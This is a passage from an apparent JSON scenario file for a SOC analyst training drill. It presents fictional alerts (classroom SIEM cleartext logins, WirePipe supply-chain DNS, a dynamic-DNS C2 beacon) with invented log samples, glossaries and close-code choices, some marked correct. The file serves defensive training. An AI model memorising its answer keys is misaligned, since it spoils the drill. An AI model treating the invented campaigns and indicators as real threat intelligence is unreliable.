              "app_pack=LogDeck_Security_Essentials",
              "app_pack=logdeck_app_for_logdeck_o11y_cloud",
              "",
              "# URI crumbs (chronological samples after the login burst)",
              "---",
              "{\"_path\":\"http\",\"ts\":\"2026-08-04T18:52:25.070141Z\",\"uid\":\"Cfict0000110\",\"id.orig_h\":\"10.44.22.11\",\"id.resp_h\":\"203.0.113.40\",\"id.resp_p\":8001,\"method\":\"GET\",\"uri\":\"/en-GB/logdeckd/__raw/servicesNS/labadmin/LogDeck_Security_Essentials/apps/local\",\"status_code\":200,\"server\":\"LogDeckd\"}",
              "---",
              "{\"_path\":\"http\",\"ts\":\"2026-08-04T18:52:25.295253Z\",\"uid\":\"Cfict0000111\",\"id.orig_h\":\"10.44.22.11\",\"id.resp_h\":\"203.0.113.40\",\"id.resp_p\":8001,\"method\":\"GET\",\"uri\":\"/en-GB/logdeckd/__raw/servicesNS/labadmin/LogDeck_Security_Essentials/data/ui/views/home\",\"status_code\":200,\"server\":\"LogDeckd\"}",
              "---",
              "{\"_path\":\"http\",\"ts\":\"2026-08-04T18:44:32.482419Z\",\"uid\":\"Cfict0000112\",\"id.orig_h\":\"10.44.22.11\",\"id.resp_h\":\"203.0.113.40\",\"id.resp_p\":8001,\"method\":\"GET\",\"uri\":\"/en-GB/logdeckd/__raw/services/appsbrowser/v1/app/\",\"status_code\":200,\"server\":\"LogDeckd\"}",
              "note=Pattern matches a temporary classroom SIEM with security-lab app packs, not a corporate production tenant"
            ]
          }
        ]
      },
      "class-peers": {
        "name": "Class peer traffic",
        "tag": "[ops]",
        "narration": "Same Malware Traffic Lab VLAN window shows peer hosts 10.44.22.12, 10.44.22.13, 10.44.22.15, and 10.44.22.16 also reaching the same cloud VPS:8001 LogDeck UI, at lower volume than 10.44.22.11 (4587 hits vs 91/62/59/5). Pattern is shared class traffic, not a singleton hostile login spray. Instructor-operated malware-traffic labs commonly drive Zeek into a classroom SIEM over HTTP for the week.",
        "evidence": [
          {
            "id": "ev-class-peers",
            "label": "class peers · same LogDeck dest",
            "detail": "Multiple classroom VLAN hosts share the cleartext LogDeck destination. Sanctioned training pattern supports BH Benign over True Positive IR.",
            "hint": [
              "peers_matching=4"
            ]
          }
        ],
        "exits": [
          {
            "to": "decision",
            "label": "Move to close codes",
            "requiresEvidence": 3
          },
          {
            "to": "dest-context",
            "label": "Return to destination profile"
          },
          {
            "to": "http-login",
            "label": "Inspect the login sessions"
          }
        ],
        "logs": [
          {
            "id": "log-class-peers",
            "title": "peer search · Malware Traffic Lab VLAN → same LogDeck dest",
            "lines": [
              "# peer search · same window · cleartext LogDeck UI on :8001",
              "query=id.resp_h=203.0.113.40 and id.resp_p=8001",
              "scope=Malware Traffic Lab VLAN samples",
              "hits  id.orig_h",
              "4587  10.44.22.11",
              "  91  10.44.22.15",
              "  62  10.44.22.12",
              "  59  10.44.22.13",
              "   5  10.44.22.16",
              "peers_matching=4",
              "note=shared class traffic on the same cloud VPS LogDeck UI — not a singleton hostile login spray"
            ]
          }
        ]
      },
      "decision": {
        "name": "Close codes",
        "tag": "[decision]",
        "narration": "Evidence covers 3 distinct cleartext LogDeck usernames in an 8m window, a cloud VPS SIEM with classroom app-pack signals, and multiple Malware Traffic Lab VLAN peers on the same destination. One BH close code fits.",
        "isDecision": true,
        "actions": [
          {
            "id": "true-positive",
            "label": "True Positive",
            "resultNote": "True Positive fits unsanctioned credential exposure that needs IR now. Peer hosts and classroom tooling show this SIEM is shared lab infrastructure; escalate as leaky class hygiene later, not as an active intrusion close."
          },
          {
            "id": "false-positive",
            "label": "False Positive",
            "resultNote": "False Positive fits a wrong detector assertion. The cleartext logins and credential fields are real; the alert was not a product failure."
          },
          {
            "id": "bh-benign",
            "label": "BH Benign",
            "correct": true,
            "resultNote": "BH Benign fits sanctioned class traffic. Cleartext credentials are ugly and worth a courtesy note, but shared classroom VLAN peers on a training LogDeck earn BH Benign rather than True Positive IR."
          }
        ]
      }
    },
    "endings": {
      "win": {
        "title": "Closed BH Benign",
        "narration": "A-5521 closed BH Benign. Cleartext classroom SIEM logins are logged for instructor awareness; no intrusion IR ticket is opened. Handover notes source 10.44.22.11 and peer reuse of the same LogDeck VPS."
      },
      "lose": {
        "title": "Wrong close code",
        "narration": "The queue records the chosen close code against evidence that still shows shared Malware Traffic Lab LogDeck traffic. The correct first close is below."
      },
      "timeout": {
        "title": "Window closed",
        "narration": "The queue moved on before a close code landed. The evidence trail remains below for review."
      }
    },
    "timeline": [
      {
        "id": "tl-labadmin",
        "t": "18:41:29",
        "label": "labadmin cleartext login POST returns 200",
        "nodes": [
          "http-login"
        ],
        "hint": [
          "18:41:29"
        ],
        "tone": "warn"
      },
      {
        "id": "tl-instructor",
        "t": "18:45:07",
        "label": "instructor+lab login via appsbrowser returns 403",
        "nodes": [
          "http-login"
        ],
        "hint": [
          "18:45:07"
        ],
        "tone": "info"
      },
      {
        "id": "tl-course-feed",
        "t": "18:49:37",
        "label": "course-feed cleartext login POST returns 200",
        "nodes": [
          "http-login"
        ],
        "hint": [
          "18:49:37"
        ],
        "tone": "warn"
      },
      {
        "id": "tl-essentials",
        "t": "18:52:25",
        "label": "LogDeck_Security_Essentials UI crumbs after the login burst",
        "nodes": [
          "dest-context"
        ],
        "hint": [
          "18:52:25",
          "LogDeck_Security_Essentials"
        ],
        "tone": "info"
      },
      {
        "id": "tl-alert",
        "t": "20:08:00",
        "label": "A-5521 opens on the 3-username cleartext SIEM login rollup",
        "nodes": [
          "observed-logs"
        ],
        "hint": [
          "usernames=3",
          "dst_port=8001"
        ],
        "tone": "critical"
      }
    ]
  },
  {
    "id": "fakecorp-supplychain-dns",
    "meta": {
      "title": "Supply-chain DNS, managed laptop",
      "briefing": "Alert A-6602 is open: ET malware signatures for WirePipe supply-chain domains from 10.44.30.12 on general Wi-Fi. Two DNS bursts ~2h apart (15:45 and 17:40): wirepipe.zone resolves (NOERROR); related lookups models.litewire.cloud and sfrlake.example return NXDOMAIN. DNS, detections, and asset context separate ambient noise from a live IOC. The correct BH close code is the goal. Target: under 3 minutes.",
      "targetSeconds": 180
    },
    "glossary": {
      "DNS": "The phone book of the internet: turns names into addresses computers dial.",
      "ET malware": "Emerging Threats rules — signature alerts that a look-up or session matched known-bad patterns.",
      "supply-chain": "Attackers poison a tool many orgs already trust, so the bad code arrives through a normal update path.",
      "WirePipe": "Fictional compromised tooling name used in this drill (stands in for a real supply-chain campaign).",
      "NXDOMAIN": "DNS answer meaning \"that name does not exist\" — like a wrong number with no forwarding.",
      "MDM": "Company device management — software that enrolls and controls a laptop or phone for IT.",
      "SaaS": "Software run in a vendor cloud that the laptop talks to for normal work.",
      "Suricata": "An IDS that watches packets and fires named rules when traffic matches known attacks.",
      "Pivot": "Jump to another log source using what is already found — follow the breadcrumb.",
      "BH close code": "How Black Hat SOC marks why an alert was closed — the official label for the outcome.",
      "True Positive": "Real bad or real impact that needed incident response. The alert was right and serious.",
      "False Positive": "The alert was wrong — it looked bad but the detection was a mistake.",
      "BH Benign": "Something that looked alarming but is allowed here (for example sanctioned class traffic).",
      "close code": "The final label on an alert that says what kind of finding it turned out to be.",
      "IR": "Incident response — the people and steps used when something real needs handling now.",
      "general Wi-Fi": "Open attendee wireless — not a training classroom VLAN.",
      "RAT": "Remote access trojan — malware that lets an attacker control a machine from afar."
    },
    "startNode": "observed-logs",
    "nodes": {
      "observed-logs": {
        "name": "Observed DNS",
        "tag": "[dns]",
        "narration": "A-6602 · High · Supply-chain DNS · 10.44.30.12 on general Wi-Fi · query wirepipe.zone NOERROR · models.litewire.cloud NXDOMAIN · sfrlake.example NXDOMAIN · two bursts ~2h apart (first sample 15:45:32, last sample 17:40:53). ET malware rules name WirePipe supply-chain and a related RAT domain.",
        "evidence": [
          {
            "id": "ev-dns-ioc",
            "label": "DNS · wirepipe.zone resolves",
            "detail": "Named supply-chain domain resolves on the conference resolver; sibling campaign names return NXDOMAIN in the same bursts.",
            "hint": [
              "wirepipe.zone",
              "NOERROR"
            ]
          }
        ],
        "exits": [
          {
            "to": "detections",
            "label": "Open detection rules"
          },
          {
            "to": "device-profile",
            "label": "Profile the source host"
          },
          {
            "to": "class-context",
            "label": "Search class traffic"
          }
        ],
        "logs": [
          {
            "id": "log-observed-logs",
            "title": "corelight_dns · supply-chain DNS rollup",
            "lines": [
              "# corelight_dns · supply-chain DNS rollup · src 10.44.30.12 · general Wi-Fi",
              "# two bursts ~2h apart: 15:45:32 and 17:40:52 (event ts from _raw_log)",
              " hits  rcode      query",
              "    4  NOERROR   wirepipe.zone",
              "    4  NXDOMAIN  models.litewire.cloud",
              "    4  NXDOMAIN  sfrlake.example",
              "   12  TOTAL    bursts=2  resolver=10.44.16.16"
            ]
          },
          {
            "id": "log-dns-timed",
            "title": "corelight_dns · timed IOC samples",
            "lines": [
              "# corelight_dns · timed IOC samples (identities fiction)",
              "id.orig_h=10.44.30.12",
              "id.resp_h=10.44.16.16",
              "id.resp_p=53",
              "id.orig_network_name=general Wi-Fi",
              "",
              "# Burst 1 · 15:45",
              "---",
              "{\"_path\":\"dns\",\"ts\":\"2026-08-04T15:45:32.343768Z\",\"uid\":\"Cfict0000201\",\"id.orig_h\":\"10.44.30.12\",\"id.resp_h\":\"10.44.16.16\",\"id.resp_p\":53,\"proto\":\"udp\",\"qtype_name\":\"A\",\"query\":\"models.litewire.cloud\",\"rcode_name\":\"NXDOMAIN\"}",
              "---",
              "{\"_path\":\"dns\",\"ts\":\"2026-08-04T15:45:32.492608Z\",\"uid\":\"Cfict0000202\",\"id.orig_h\":\"10.44.30.12\",\"id.resp_h\":\"10.44.16.16\",\"id.resp_p\":53,\"proto\":\"udp\",\"qtype_name\":\"A\",\"query\":\"wirepipe.zone\",\"rcode_name\":\"NOERROR\"}",
              "---",
              "{\"_path\":\"dns\",\"ts\":\"2026-08-04T15:45:37.675742Z\",\"uid\":\"Cfict0000203\",\"id.orig_h\":\"10.44.30.12\",\"id.resp_h\":\"10.44.16.16\",\"id.resp_p\":53,\"proto\":\"udp\",\"qtype_name\":\"A\",\"query\":\"sfrlake.example\",\"rcode_name\":\"NXDOMAIN\"}",
              "",
              "# Burst 2 · 17:40",
              "---",
              "{\"_path\":\"dns\",\"ts\":\"2026-08-04T17:40:52.586659Z\",\"uid\":\"Cfict0000211\",\"id.orig_h\":\"10.44.30.12\",\"id.resp_h\":\"10.44.16.16\",\"id.resp_p\":53,\"proto\":\"udp\",\"qtype_name\":\"A\",\"query\":\"models.litewire.cloud\",\"rcode_name\":\"NXDOMAIN\"}",
              "---",
              "{\"_path\":\"dns\",\"ts\":\"2026-08-04T17:40:52.737662Z\",\"uid\":\"Cfict0000212\",\"id.orig_h\":\"10.44.30.12\",\"id.resp_h\":\"10.44.16.16\",\"id.resp_p\":53,\"proto\":\"udp\",\"qtype_name\":\"A\",\"query\":\"wirepipe.zone\",\"rcode_name\":\"NOERROR\"}",
              "---",
              "{\"_path\":\"dns\",\"ts\":\"2026-08-04T17:40:53.881172Z\",\"uid\":\"Cfict0000213\",\"id.orig_h\":\"10.44.30.12\",\"id.resp_h\":\"10.44.16.16\",\"id.resp_p\":53,\"proto\":\"udp\",\"qtype_name\":\"A\",\"query\":\"sfrlake.example\",\"rcode_name\":\"NXDOMAIN\"}"
            ]
          }
        ]
      },
      "detections": {
        "name": "Detection stack",
        "tag": "[ids]",
        "narration": "Suricata window for 10.44.30.12 shows 12 ET malware hits on WirePipe supply-chain DNS and repeated RAT-domain lookups across both bursts (15:45 and 17:40). Hits are signature-true on the wire. Campaign public write-ups are months old; age does not erase a live resolve of a named C2/supply-chain indicator on the floor.",
        "evidence": [
          {
            "id": "ev-et-hits",
            "label": "ET malware · WirePipe + RAT DNS",
            "detail": "IDS rules fire on real queries. Old campaign timelines do not convert a live resolve into ambient noise.",
            "hint": [
              "ET MALWARE Observed DNS Query to WirePipe Supply Chain Attack Domain (wirepipe .zone)",
              "plain-cipher-js RAT"
            ]
          }
        ],
        "exits": [
          {
            "to": "device-profile",
            "label": "Profile the source host"
          },
          {
            "to": "class-context",
            "label": "Search class traffic"
          },
          {
            "to": "observed-logs",
            "label": "Return to observed DNS"
          }
        ],
        "logs": [
          {
            "id": "log-et-hint",
            "title": "HINT · suricata_corelight · ET malware DNS",
            "lines": [
              "# Hint from the wire (obfuscated from live Suricata DNS alerts)",
              "# Same shape the hunt thread called out: ET MALWARE on WirePipe + RAT DNS",
              "id.orig_h=10.44.30.12",
              "service=dns",
              "alert.severity=2",
              "alert.action=allowed",
              "network=general Wi-Fi",
              "note=signature-true ET malware DNS hits; campaign age does not clear a live resolve",
              "",
              "# Signature rollup (hits match DNS lookup counts)",
              " hits  alert.signature",
              "    4  ET MALWARE Observed DNS Query to WirePipe Supply Chain Attack Domain (wirepipe .zone)",
              "    4  ET MALWARE Observed DNS Query to WirePipe Supply Chain Attack Domain (litewire .cloud)",
              "    4  ET MALWARE plain-cipher-js RAT C2 Domain in DNS Lookup (sfrlake .example)",
              "   12  TOTAL"
            ]
          },
          {
            "id": "log-et-timed",
            "title": "suricata_corelight · timed ET malware samples",
            "lines": [
              "# suricata_corelight · timed ET malware DNS samples (identities fiction)",
              "id.orig_h=10.44.30.12",
              "service=dns",
              "",
              "# Burst 1 · 15:45",
              "---",
              "{\"_path\":\"suricata_corelight\",\"ts\":\"2026-08-04T15:45:32.343768Z\",\"uid\":\"Cfict0000201\",\"id.orig_h\":\"10.44.30.12\",\"id.resp_h\":\"10.44.16.16\",\"id.resp_p\":53,\"service\":\"dns\",\"alert.signature\":\"ET MALWARE Observed DNS Query to WirePipe Supply Chain Attack Domain (litewire .cloud)\",\"alert.signature_id\":2068453,\"alert.severity\":2,\"alert.category\":\"A Network Trojan was detected\",\"alert.action\":\"allowed\"}",
              "---",
              "{\"_path\":\"suricata_corelight\",\"ts\":\"2026-08-04T15:45:32.492608Z\",\"uid\":\"Cfict0000202\",\"id.orig_h\":\"10.44.30.12\",\"id.resp_h\":\"10.44.16.16\",\"id.resp_p\":53,\"service\":\"dns\",\"alert.signature\":\"ET MALWARE Observed DNS Query to WirePipe Supply Chain Attack Domain (wirepipe .zone)\",\"alert.signature_id\":2068454,\"alert.severity\":2,\"alert.category\":\"A Network Trojan was detected\",\"alert.action\":\"allowed\"}",
              "---",
              "{\"_path\":\"suricata_corelight\",\"ts\":\"2026-08-04T15:45:37.675742Z\",\"uid\":\"Cfict0000203\",\"id.orig_h\":\"10.44.30.12\",\"id.resp_h\":\"10.44.16.16\",\"id.resp_p\":53,\"service\":\"dns\",\"alert.signature\":\"ET MALWARE plain-cipher-js RAT C2 Domain in DNS Lookup (sfrlake .example)\",\"alert.signature_id\":2068515,\"alert.severity\":2,\"alert.category\":\"Domain Observed Used for C2 Detected\",\"alert.action\":\"allowed\"}",
              "",
              "# Burst 2 · 17:40",
              "---",
              "{\"_path\":\"suricata_corelight\",\"ts\":\"2026-08-04T17:40:52.586659Z\",\"uid\":\"Cfict0000211\",\"id.orig_h\":\"10.44.30.12\",\"id.resp_h\":\"10.44.16.16\",\"id.resp_p\":53,\"service\":\"dns\",\"alert.signature\":\"ET MALWARE Observed DNS Query to WirePipe Supply Chain Attack Domain (litewire .cloud)\",\"alert.signature_id\":2068453,\"alert.severity\":2,\"alert.action\":\"allowed\"}",
              "---",
              "{\"_path\":\"suricata_corelight\",\"ts\":\"2026-08-04T17:40:52.737302Z\",\"uid\":\"Cfict0000212\",\"id.orig_h\":\"10.44.30.12\",\"id.resp_h\":\"10.44.16.16\",\"id.resp_p\":53,\"service\":\"dns\",\"alert.signature\":\"ET MALWARE Observed DNS Query to WirePipe Supply Chain Attack Domain (wirepipe .zone)\",\"alert.signature_id\":2068454,\"alert.severity\":2,\"alert.action\":\"allowed\"}",
              "---",
              "{\"_path\":\"suricata_corelight\",\"ts\":\"2026-08-04T17:40:53.881172Z\",\"uid\":\"Cfict0000213\",\"id.orig_h\":\"10.44.30.12\",\"id.resp_h\":\"10.44.16.16\",\"id.resp_p\":53,\"service\":\"dns\",\"alert.signature\":\"ET MALWARE plain-cipher-js RAT C2 Domain in DNS Lookup (sfrlake .example)\",\"alert.signature_id\":2068515,\"alert.severity\":2,\"alert.action\":\"allowed\"}"
            ]
          }
        ]
      },
      "device-profile": {
        "name": "Device profile",
        "tag": "[asset]",
        "narration": "Host presents as a managed Windows endpoint under GLASSLINE MDM with SaaS tenants for glassline.example. TLS crumbs near the first burst hit saas.glassline.example, login-saas.glassline.example, and MDM check-in hosts. Corp-looking management traffic is normal for that asset class. MDM and SaaS context explain identity; they do not clear ET malware DNS to WirePipe infrastructure.",
        "evidence": [
          {
            "id": "ev-mdm-corp",
            "label": "managed · GLASSLINE MDM",
            "detail": "Source looks like a managed GLASSLINE laptop. Identity context only; not a BH Benign for supply-chain DNS.",
            "hint": [
              "mdm=GLASSLINE MDM",
              "saas.glassline.example"
            ]
          }
        ],
        "exits": [
          {
            "to": "class-context",
            "label": "Search class traffic"
          },
          {
            "to": "detections",
            "label": "Open detection rules"
          },
          {
            "to": "observed-logs",
            "label": "Return to observed DNS"
          }
        ],
        "logs": [
          {
            "id": "log-device-profile",
            "title": "asset profile · GLASSLINE MDM + SaaS crumbs",
            "lines": [
              "# asset profile · 10.44.30.12 (obfuscated from live dns+ssl rows)",
              "hostname=GLASSLINE-W11",
              "os=Windows",
              "mdm=GLASSLINE MDM",
              "org=GLASSLINE",
              "network=general Wi-Fi",
              "saas=saas.glassline.example",
              "saas=login-saas.glassline.example",
              "mdm_checkin=checkin.dm.glassline-mdm.example",
              "mdm_agents=agents.manage.glassline-mdm.example",
              "idp=login.glassline-id.example",
              "note=MDM/SaaS explain identity; they do not clear ET malware DNS to WirePipe infrastructure",
              "",
              "# Timed TLS crumbs near burst 1 (server_name fiction · dest IPs TEST-NET)",
              "---",
              "{\"_path\":\"ssl\",\"ts\":\"2026-08-04T15:44:57.889609Z\",\"uid\":\"Cfict0000221\",\"id.orig_h\":\"10.44.30.12\",\"id.resp_h\":\"203.0.113.51\",\"id.resp_p\":443,\"server_name\":\"login.glassline-id.example\",\"version\":\"TLSv13\"}",
              "---",
              "{\"_path\":\"ssl\",\"ts\":\"2026-08-04T15:45:04.769150Z\",\"uid\":\"Cfict0000222\",\"id.orig_h\":\"10.44.30.12\",\"id.resp_h\":\"198.51.100.41\",\"id.resp_p\":443,\"server_name\":\"saas.glassline.example\",\"version\":\"TLSv12\"}",
              "---",
              "{\"_path\":\"ssl\",\"ts\":\"2026-08-04T15:45:10.451817Z\",\"uid\":\"Cfict0000223\",\"id.orig_h\":\"10.44.30.12\",\"id.resp_h\":\"203.0.113.52\",\"id.resp_p\":443,\"server_name\":\"login-saas.glassline.example\",\"version\":\"TLSv13\"}",
              "---",
              "{\"_path\":\"ssl\",\"ts\":\"2026-08-04T15:45:26.130382Z\",\"uid\":\"Cfict0000224\",\"id.orig_h\":\"10.44.30.12\",\"id.resp_h\":\"198.51.100.42\",\"id.resp_p\":443,\"server_name\":\"checkin.dm.glassline-mdm.example\",\"version\":\"TLSv13\"}",
              "---",
              "{\"_path\":\"ssl\",\"ts\":\"2026-08-04T15:49:30.091210Z\",\"uid\":\"Cfict0000225\",\"id.orig_h\":\"10.44.30.12\",\"id.resp_h\":\"203.0.113.53\",\"id.resp_p\":443,\"server_name\":\"agents.manage.glassline-mdm.example\",\"version\":\"TLSv12\"}"
            ]
          }
        ]
      },
      "class-context": {
        "name": "Class traffic",
        "tag": "[ops]",
        "narration": "Training VLAN and lab SSID samples in the same window show no peer hosts resolving wirepipe.zone or the sibling NXDOMAIN names. Pattern is unique to 10.44.30.12 on general Wi-Fi, not shared coursework.",
        "evidence": [
          {
            "id": "ev-no-peers-sc",
            "label": "no class peers · general Wi-Fi",
            "detail": "Sanctioned lab malware DNS would show classroom peers. This host is alone on attendee Wi-Fi; BH Benign does not fit.",
            "hint": [
              "peers_matching=0"
            ]
          }
        ],
        "exits": [
          {
            "to": "decision",
            "label": "Move to close codes",
            "requiresEvidence": 3
          },
          {
            "to": "device-profile",
            "label": "Return to device profile"
          },
          {
            "to": "detections",
            "label": "Open detection rules"
          }
        ],
        "logs": [
          {
            "id": "log-class-context",
            "title": "peer search · training VLAN / lab SSID → WirePipe DNS",
            "lines": [
              "# peer search · same window · WirePipe / sibling campaign DNS",
              "query=query in (wirepipe.zone,models.litewire.cloud,sfrlake.example)",
              "             and id.orig_h != 10.44.30.12",
              "scope=training VLAN + lab SSID samples",
              "peers_matching=0",
              "note=pattern unique to 10.44.30.12 on general Wi-Fi — not shared coursework"
            ]
          }
        ]
      },
      "decision": {
        "name": "Close codes",
        "tag": "[decision]",
        "narration": "Evidence covers a live resolve of wirepipe.zone across two bursts (~2h), 12 ET malware hits including related RAT DNS, GLASSLINE MDM that explains the laptop but not the IOC, and no classroom peer pattern. One BH close code fits.",
        "isDecision": true,
        "actions": [
          {
            "id": "true-positive",
            "label": "True Positive",
            "correct": true,
            "resultNote": "Live supply-chain and RAT DNS on the floor is a confirmed finding that needs owner contact and IR follow-up, even when the public campaign is old. Close True Positive."
          },
          {
            "id": "false-positive",
            "label": "False Positive",
            "resultNote": "False Positive fits a wrong detector assertion. The DNS queries and ET hits are real; the alert was not a product failure."
          },
          {
            "id": "bh-benign",
            "label": "BH Benign",
            "resultNote": "BH Benign fits sanctioned class or non-hostile expected traffic. No lab peers share this WirePipe DNS; MDM alone does not sanction malware-domain resolves."
          }
        ]
      }
    },
    "endings": {
      "win": {
        "title": "Closed True Positive",
        "narration": "A-6602 closed True Positive. On-site IR contacts the GLASSLINE asset owner about WirePipe supply-chain DNS from 10.44.30.12. Handover notes the resolve and sibling NXDOMAIN lookups."
      },
      "lose": {
        "title": "Wrong close code",
        "narration": "The queue records the chosen close code against evidence that still shows live supply-chain DNS outside class sanction. The correct first close is below."
      },
      "timeout": {
        "title": "Window closed",
        "narration": "The queue moved on before a close code landed. The evidence trail remains below for review."
      }
    },
    "timeline": [
      {
        "id": "tl-mdm",
        "t": "15:45:04",
        "label": "GLASSLINE SaaS TLS crumb saas.glassline.example near burst 1",
        "nodes": [
          "device-profile"
        ],
        "hint": [
          "15:45:04",
          "saas.glassline.example"
        ],
        "tone": "info"
      },
      {
        "id": "tl-burst1-resolve",
        "t": "15:45:32",
        "label": "first burst: models.litewire.cloud NXDOMAIN then wirepipe.zone NOERROR",
        "nodes": [
          "observed-logs"
        ],
        "hint": [
          "15:45:32",
          "wirepipe.zone"
        ],
        "tone": "warn"
      },
      {
        "id": "tl-burst1-rat",
        "t": "15:45:37",
        "label": "first burst: sfrlake.example NXDOMAIN with matching ET RAT DNS hit",
        "nodes": [
          "detections"
        ],
        "hint": [
          "15:45:37",
          "plain-cipher-js RAT"
        ],
        "tone": "critical"
      },
      {
        "id": "tl-burst2",
        "t": "17:40:52",
        "label": "second burst: WirePipe supply-chain DNS repeats with ET hits",
        "nodes": [
          "observed-logs",
          "detections"
        ],
        "hint": [
          "17:40:52"
        ],
        "tone": "warn"
      },
      {
        "id": "tl-alert",
        "t": "17:42:00",
        "label": "A-6602 opens on the WirePipe DNS + ET malware rollup",
        "nodes": [
          "observed-logs"
        ],
        "hint": [
          "bursts=2",
          "wirepipe.zone"
        ],
        "tone": "critical"
      }
    ]
  },
  {
    "id": "northlab-singleton-c2",
    "meta": {
      "title": "Singleton C2 DNS, class temptation",
      "briefing": "Alert A-6610 is open: dynamic DNS name starbright.ddns.example from 10.44.31.21 on a Social Engineering Lab VLAN, plus C2-like TLS and a multi-day (~3 day) beacon pattern (947 A lookups across Aug 2–4; 8067 S0 TCP sessions to the resolved A on :4061). First-pass tooling calls class traffic; peer search and syllabus coverage still need checking. The correct BH close code is the goal. Target: under 3 minutes.",
      "targetSeconds": 180
    },
    "glossary": {
      "dynamic DNS": "A hostname that can point at changing IPs — handy for labs, also common in malware callbacks.",
      "C2": "Command and control — the remote brain malware calls home to for instructions.",
      "beacon": "A regular check-in pattern from a host to a remote address, like a heartbeat.",
      "DDNS": "Short for dynamic DNS — a moving hostname often used for callbacks.",
      "VLAN": "A sliced-off piece of the network, like a separate hallway in the same building.",
      "classroom VLAN": "The network slice assigned to a training room — peers here often share class tooling.",
      "Suricata": "An IDS that watches packets and fires named rules when traffic matches known attacks.",
      "TLS": "The lock on a web connection (the S in HTTPS).",
      "S0": "A Zeek connection state meaning the client sent SYN and never got a reply — dead-air dialing.",
      "Pivot": "Jump to another log source using what is already found — follow the breadcrumb.",
      "BH close code": "How Black Hat SOC marks why an alert was closed — the official label for the outcome.",
      "True Positive": "Real bad or real impact that needed incident response. The alert was right and serious.",
      "False Positive": "The alert was wrong — it looked bad but the detection was a mistake.",
      "BH Benign": "Something that looked alarming but is allowed here (for example sanctioned class traffic).",
      "close code": "The final label on an alert that says what kind of finding it turned out to be.",
      "IR": "Incident response — the people and steps used when something real needs handling now.",
      "peer hosts": "Other devices on the same classroom network doing similar traffic.",
      "syllabus": "The course plan — what the class is supposed to touch on the wire.",
      "RailBeacon": "A fictional C2-framework label used in this drill for self-signed callback certificates."
    },
    "startNode": "observed-logs",
    "nodes": {
      "observed-logs": {
        "name": "Observed DNS",
        "tag": "[dns]",
        "narration": "A-6610 · High · Dynamic DNS C2 · 10.44.31.21 → starbright.ddns.example · Social Engineering Lab VLAN label · first auto-summary says likely coursework. Resolver shows 947 A lookups across ~3 calendar days (first sample 2026-08-02T15:54:53Z, last sample 2026-08-04T19:27:05Z), not a single lab spike.",
        "evidence": [
          {
            "id": "ev-ddns-c2",
            "label": "DDNS · starbright.ddns.example",
            "detail": "Host repeatedly resolves a dynamic DNS name tied in intel to remote-access malware families. VLAN label alone is not a close.",
            "hint": [
              "starbright.ddns.example",
              "days=3"
            ]
          }
        ],
        "exits": [
          {
            "to": "c2-sessions",
            "label": "Inspect follow-up sessions"
          },
          {
            "to": "auto-class",
            "label": "Review the class hypothesis"
          },
          {
            "to": "class-peers",
            "label": "Search class peer traffic"
          }
        ],
        "logs": [
          {
            "id": "log-observed-logs",
            "title": "corelight_dns · DDNS A-lookup rollup",
            "lines": [
              "# corelight_dns · DDNS A-lookup rollup · src 10.44.31.21",
              "# window from event ts: 2026-08-02T15:54:53Z → 2026-08-04T19:27:05Z (~3 calendar days)",
              " hits  qtype  rcode     query",
              "  947  A      NOERROR   starbright.ddns.example",
              "  947  TOTAL  answers=203.0.113.141  days=3  src_hosts=1"
            ]
          }
        ]
      },
      "c2-sessions": {
        "name": "Follow-up sessions",
        "tag": "[ssl]",
        "narration": "After DNS, 10.44.31.21 opens TLS and raw TCP toward 203.0.113.141:4061 — the A answer for starbright.ddns.example. Sampled follow-ups stay conn_state=S0 (8067 total in the window). A self-signed RailBeacon C2 certificate appears at 17:08:14 on Aug 4. Packed executable download notices appear once. Traffic is not constrained to a published lab appliance address.",
        "evidence": [
          {
            "id": "ev-beacon",
            "label": "multi-day beacon · S0 on :4061",
            "detail": "Callback pattern spans days with C2-like TLS and dead-air TCP. Duration and destinations argue prior compromise over a one-hour lab block.",
            "hint": [
              "conn_state=S0",
              "id.resp_p=4061"
            ]
          }
        ],
        "exits": [
          {
            "to": "auto-class",
            "label": "Review the class hypothesis"
          },
          {
            "to": "class-peers",
            "label": "Search class peer traffic"
          },
          {
            "to": "observed-logs",
            "label": "Return to observed DNS"
          }
        ],
        "logs": [
          {
            "id": "log-c2-hint",
            "title": "HINT · corelight · DDNS resolve + S0 callbacks on :4061",
            "lines": [
              "# Hint from the wire (obfuscated from live Corelight dns/conn/x509 rows)",
              "# Same shape the hunt thread called out: DDNS resolve + relentless S0 to the A answer",
              "id.orig_h=10.44.31.21",
              "query=starbright.ddns.example",
              "answers=203.0.113.141",
              "id.resp_h=203.0.113.141",
              "id.resp_p=4061",
              "conn_state=S0",
              "history=S",
              "certificate.issuer=O=RailBeacon C2",
              "notice=SSL::Invalid_Server_Cert",
              "notice=ET MALWARE RailBeacon Framework SSL/TLS Certificate Observed",
              "notice=ET INFO Packed Executable Download",
              "note=multi-day DDNS + dead-air TCP on :4061; not constrained to a published lab appliance",
              "",
              "# Example rows (fields compacted)",
              "{\"_path\":\"dns\",\"ts\":\"2026-08-02T15:54:53.503193Z\",\"uid\":\"Cfict0003101\",\"id.orig_h\":\"10.44.31.21\",\"id.resp_h\":\"10.44.0.53\",\"id.resp_p\":53,\"query\":\"starbright.ddns.example\",\"qtype_name\":\"A\",\"rcode_name\":\"NOERROR\",\"answers\":[\"203.0.113.141\"],\"id.vlan\":4431,\"proto\":\"udp\"}",
              "{\"_path\":\"conn\",\"ts\":\"2026-08-02T15:51:41.381743Z\",\"uid\":\"Cfict0003201\",\"id.orig_h\":\"10.44.31.21\",\"id.resp_h\":\"203.0.113.141\",\"id.resp_p\":4061,\"proto\":\"tcp\",\"conn_state\":\"S0\",\"history\":\"S\",\"id.vlan\":4431,\"id.resp_h_name.vals\":[\"starbright.ddns.example\"]}",
              "{\"_path\":\"x509\",\"ts\":\"2026-08-04T17:08:14.807151Z\",\"certificate.issuer\":\"O=RailBeacon C2\",\"certificate.subject\":\"O=RailBeacon C2\",\"certificate.key_type\":\"ecdsa\",\"certificate.key_length\":384,\"certificate.not_valid_before\":\"2026-07-29T09:17:24.000000Z\",\"certificate.not_valid_after\":\"2027-07-29T09:17:24.000000Z\",\"certificate.serial\":\"CCF4C957D5D89823A8C683353919CB06\",\"fingerprint\":\"d119a70ffbc849a1848bce7dc46d58337d7a49391bda9b45ca144d956f10537e\",\"host_cert\":true,\"vlan\":4431}"
            ]
          },
          {
            "id": "log-c2-sessions",
            "title": "corelight_conn + dns · timed beacon samples",
            "lines": [
              "# corelight_conn + dns · timed beacon samples (identities fiction)",
              "id.orig_h=10.44.31.21",
              "id.resp_h=203.0.113.141",
              "id.resp_p=4061",
